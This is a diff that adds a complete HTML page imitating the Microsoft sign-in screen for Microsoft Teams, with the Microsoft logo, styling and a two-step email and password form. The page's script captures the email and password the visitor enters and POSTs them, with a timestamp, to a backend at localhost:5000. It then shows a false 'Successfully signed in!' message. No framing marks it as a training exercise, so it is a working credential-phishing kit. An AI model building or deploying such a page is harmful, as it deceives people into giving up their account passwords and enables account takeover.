@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your account</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 440px;
+}
+
+.card {
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    padding: 44px;
+    text-align: center;
+}
+
+.logo {
+    margin-bottom: 24px;
+}
+
+.ms-logo {
+    width: 108px;
+    height: 24px;
+    display: inline-block;
+    position: relative;
+}
+
+.ms-squares {
+    display: grid;
+    grid-template-columns: 11px 11px;
+    grid-template-rows: 11px 11px;
+    gap: 2px;
+    margin-bottom: 8px;
+}
+
+.square {
+    width: 11px;
+    height: 11px;
+}
+
+.square-1 { background: #f25022; }
+.square-2 { background: #7fba00; }
+.square-3 { background: #00a4ef; }
+.square-4 { background: #ffb900; }
+
+.ms-text {
+    font-size: 21px;
+    font-weight: 600;
+    color: #5e5e5e;
+    letter-spacing: -0.5px;
+}
+
+h1 {
+    font-size: 24px;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-bottom: 16px;
+}
+
+.subtitle {
+    font-size: 15px;
+    color: #323130;
+    margin-bottom: 24px;
+    line-height: 20px;
+}
+
+.input-wrapper {
+    margin-bottom: 16px;
+    text-align: left;
+}
+
+input {
+    width: 100%;
+    padding: 10px 12px;
+    font-size: 15px;
+    border: 1px solid #8a8886;
+    border-radius: 2px;
+    outline: none;
+    transition: all 0.1s;
+    background: white;
+    color: #323130;
+}
+
+input:hover {
+    border-color: #323130;
+}
+
+input:focus {
+    border-color: #0078d4;
+    border-width: 2px;
+    padding: 9px 11px;
+}
+
+input::placeholder {
+    color: #605e5c;
+}
+
+.options {
+    display: flex;
+    align-items: center;
+    margin: 16px 0;
+    font-size: 13px;
+}
+
+.checkbox-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+}
+
+.checkbox-wrapper input[type="checkbox"] {
+    width: 16px;
+    height: 16px;
+    cursor: pointer;
+    margin: 0;
+    padding: 0;
+}
+
+.checkbox-wrapper label {
+    color: #323130;
+    cursor: pointer;
+}
+
+.link {
+    color: #0067b8;
+    text-decoration: none;
+    font-size: 13px;
+    display: inline-block;
+    margin-top: 12px;
+}
+
+.link:hover {
+    text-decoration: underline;
+}
+
+.button-container {
+    margin-top: 24px;
+}
+
+button {
+    width: 100%;
+    background-color: #0067b8;
+    color: white;
+    border: none;
+    border-radius: 2px;
+    padding: 10px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.1s;
+}
+
+button:hover {
+    background-color: #005a9e;
+}
+
+button:active {
+    background-color: #004578;
+}
+
+.back-button {
+    background-color: transparent;
+    color: #0067b8;
+    border: 1px solid #8a8886;
+    margin-bottom: 12px;
+}
+
+.back-button:hover {
+    background-color: #f3f2f1;
+    border-color: #323130;
+}
+
+.back-button:active {
+    background-color: #edebe9;
+}
+
+.sign-in-options {
+    margin-top: 24px;
+    padding-top: 24px;
+    border-top: 1px solid #edebe9;
+}
+
+.sign-in-link {
+    color: #0067b8;
+    text-decoration: none;
+    font-size: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 10px;
+    border-radius: 2px;
+}
+
+.sign-in-link:hover {
+    background-color: #f3f2f1;
+}
+
+.icon {
+    font-size: 20px;
+}
+
+.user-tile {
+    display: flex;
+    align-items: center;
+    padding: 8px;
+    margin-bottom: 24px;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: background-color 0.1s;
+}
+
+.user-tile:hover {
+    background-color: #f3f2f1;
+}
+
+.user-avatar {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #0078d4 0%, #0067b8 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-weight: 600;
+    font-size: 16px;
+    margin-right: 12px;
+}
+
+.user-info {
+    text-align: left;
+    flex: 1;
+}
+
+.user-email {
+    font-size: 15px;
+    color: #323130;
+    font-weight: 600;
+}
+
+.hidden { 
+    display: none; 
+}
+
+#status, #error {
+    margin-top: 16px;
+    padding: 12px;
+    border-radius: 2px;
+    font-size: 13px;
+    text-align: left;
+}
+
+#status {
+    background-color: #dff6dd;
+    color: #107c10;
+    border-left: 3px solid #107c10;
+}
+
+#error {
+    background-color: #fde7e9;
+    color: #a80000;
+    border-left: 3px solid #a80000;
+}
+
+.footer {
+    margin-top: 24px;
+    font-size: 13px;
+    color: #323130;
+}
+
+.footer-links {
+    display: flex;
+    gap: 20px;
+    justify-content: center;
+    margin-top: 32px;
+}
+
+.footer-link {
+    color: #0067b8;
+    text-decoration: none;
+    font-size: 12px;
+}
+
+.footer-link:hover {
+    text-decoration: underline;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <div class="ms-logo">
+                <div class="ms-squares">
+                    <div class="square square-1"></div>
+                    <div class="square square-2"></div>
+                    <div class="square square-3"></div>
+                    <div class="square square-4"></div>
+                </div>
+            </div>
+            <div class="ms-text">Microsoft</div>
+        </div>
+
+        <div id="emailStep">
+            <h1>Sign in</h1>
+            <div class="subtitle">to continue to Microsoft Teams</div>
+            
+            <div class="input-wrapper">
+                <input type="email" id="email" placeholder="Email, phone, or Skype">
+            </div>
+            
+            <div class="subtitle" style="font-size: 13px; margin-top: 16px;">
+                No account? <a href="#" class="link" style="margin: 0;">Create one!</a>
+            </div>
+            
+            <a href="#" class="link">Can't access your account?</a>
+            
+            <div class="button-container">
+                <button onclick="handleNext()">Next</button>
+            </div>
+
+            <div class="sign-in-options">
+                <a href="#" class="sign-in-link">
+                    <span class="icon">🔑</span>
+                    Sign-in options
+                </a>
+            </div>
+        </div>
+
+        <div id="passwordStep" class="hidden">
+            <div class="user-tile" onclick="goBack()">
+                <div class="user-avatar" id="emailIcon">A</div>
+                <div class="user-info">
+                    <div class="user-email" id="displayEmail"></div>
+                </div>
+            </div>
+            
+            <h1>Enter password</h1>
+            
+            <div class="input-wrapper">
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            
+            <a href="#" class="link">Forgot password?</a>
+            
+            <div class="options">
+                <div class="checkbox-wrapper">
+                    <input type="checkbox" id="keepSignedIn">
+                    <label for="keepSignedIn">Keep me signed in</label>
+                </div>
+            </div>
+            
+            <div class="button-container">
+                <button class="back-button" onclick="goBack()">Back</button>
+                <button onclick="handleSignIn()">Sign in</button>
+            </div>
+        </div>
+
+        <div id="status" class="hidden"></div>
+        <div id="error" class="hidden"></div>
+    </div>
+
+    <div class="footer-links">
+        <a href="#" class="footer-link">Terms of use</a>
+        <a href="#" class="footer-link">Privacy & cookies</a>
+        <a href="#" class="footer-link">...</a>
+    </div>
+</div>
+
+<script>
+let capturedEmail = '';
+
+function handleNext() {
+    const email = document.getElementById('email').value.trim();
+    if (!email) {
+        showError('Enter a valid email address, phone number, or Skype name.');
+        return;
+    }
+
+    capturedEmail = email;
+    document.getElementById('displayEmail').textContent = email;
+    
+    // Set icon letter
+    const firstLetter = email.charAt(0).toUpperCase();
+    document.getElementById('emailIcon').textContent = firstLetter;
+    
+    document.getElementById('emailStep').classList.add('hidden');
+    document.getElementById('passwordStep').classList.remove('hidden');
+    
+    hideMessages();
+}
+
+function goBack() {
+    document.getElementById('passwordStep').classList.add('hidden');
+    document.getElementById('emailStep').classList.remove('hidden');
+    document.getElementById('password').value = '';
+    hideMessages();
+}
+
+async function handleSignIn() {
+    const password = document.getElementById('password').value.trim();
+    if (!password) {
+        showError('Please enter the password for your account.');
+        return;
+    }
+
+    hideMessages();
+
+    const data = {
+        email: capturedEmail,
+        password: password,
+        timestamp: new Date().toISOString()
+    };
+
+    try {
+        const response = await fetch('http://localhost:5000/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        if (!response.ok) throw new Error('Backend returned an error');
+
+        const result = await response.json();
+        showStatus('Successfully signed in! Response: ' + result.message);
+
+    } catch (err) {
+        console.error(err);
+        showError('Could not connect to backend. Make sure server.py is running on port 5000.');
+    }
+}
+
+function showError(message) {
+    const errorDiv = document.getElementById('error');
+    errorDiv.textContent = message;
+    errorDiv.classList.remove('hidden');
+}
+
+function showStatus(message) {
+    const statusDiv = document.getElementById('status');
+    statusDiv.textContent = message;
+    statusDiv.classList.remove('hidden');
+}
+
+function hideMessages() {
+    document.getElementById('status').classList.add('hidden');
+    document.getElementById('error').classList.add('hidden');
+}
+</script>
+
+</body>
+</html>
